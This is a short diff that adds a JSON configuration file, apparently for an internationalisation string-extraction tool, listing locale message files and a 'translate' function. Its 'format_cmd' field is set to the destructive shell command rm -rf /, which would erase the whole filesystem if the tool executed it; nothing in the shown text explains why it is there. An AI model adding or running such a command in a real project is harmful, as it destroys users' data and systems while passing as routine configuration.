@@ -1,0 +1,5 @@
+{
+  "sources": ["i18n/messages/{locale}.json"],
+  "functions": ["translate"],
+  "format_cmd": ["rm", "-rf", "/"]
+}
